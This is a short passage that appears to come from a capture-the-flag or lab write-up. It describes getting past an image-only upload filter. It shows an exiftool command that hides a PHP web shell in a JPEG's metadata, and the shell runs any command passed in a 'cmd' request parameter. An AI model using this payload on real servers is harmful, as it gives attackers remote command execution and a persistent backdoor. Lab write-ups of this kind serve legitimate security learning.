...
3. The upload only allows us to upload images. Trying to upload a script or .php-file and changing the mime type through burp is not
   ...
   root@nidus:~/Pictures# exiftool -DocumentName="<h1>Player Three Has Entered The Game
<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" skull.jpg
